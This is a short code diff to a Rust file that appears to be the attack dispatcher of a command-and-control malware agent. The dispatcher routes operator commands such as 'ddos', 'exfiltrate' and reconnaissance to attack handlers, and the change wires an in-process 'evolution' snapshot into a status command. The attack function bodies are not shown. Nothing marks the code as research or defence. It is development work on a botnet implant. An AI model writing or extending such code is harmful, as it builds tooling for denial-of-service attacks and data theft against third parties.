@@ -2,13 +2,18 @@ use crate::commands::Command;
 use crate::error::C2Error;
 use crate::recon::{ReconConfig, ReconEngine};
 use crate::compute::capability;
+use stalinium_evolution::node::SoupSnapshot;
 use tokio::net::TcpStream;
 use tokio::io::AsyncWriteExt;
+use tokio::sync::watch;
 use std::process::Command as ShellCommand;
 use std::fs;
 use std::io::{Read, Write};
 
-pub async fn execute_attack(command: &Command) -> Result<String, C2Error> {
+pub async fn execute_attack(
+    command: &Command,
+    evo_snap: &watch::Receiver<SoupSnapshot>,
+) -> Result<String, C2Error> {
     match command.command.as_str() {
         "ddos" => ddos_attack(&command.args).await.map(|_| "OK".to_string()),
         "exfiltrate" => data_exfiltration(&command.args).await.map(|_| "OK".to_string()),
@@ -19,7 +24,7 @@ pub async fn execute_attack(command: &Command) -> Result<String, C2Error> {
         "recon_full" => recon_full(&command.args).await,
         "compute_profile" => compute_profile().await,
         "compute_status" => compute_status(&command.args).await,
-        "evolution_status" => evolution_status().await,
+        "evolution_status" => evolution_status(evo_snap).await,
         _ => Err(C2Error::CommandError("Unknown command".to_string())),
     }
 }
@@ -173,8 +178,9 @@ async fn compute_status(_args: &[String]) -> Result<String, C2Error> {
     serde_json::to_string(&score).map_err(|e| C2Error::CommandError(e.to_string()))
 }
 
-async fn evolution_status() -> Result<String, C2Error> {
-    Ok("{\"status\":\"soup_running\",\"note\":\"evolution status requires in-process handle\"}".to_string())
+async fn evolution_status(snap_rx: &watch::Receiver<SoupSnapshot>) -> Result<String, C2Error> {
+    let snap = snap_rx.borrow().clone();
+    serde_json::to_string(&snap).map_err(|e| C2Error::CommandError(e.to_string()))
 }
 
 async fn recon_full(args: &[String]) -> Result<String, C2Error> {
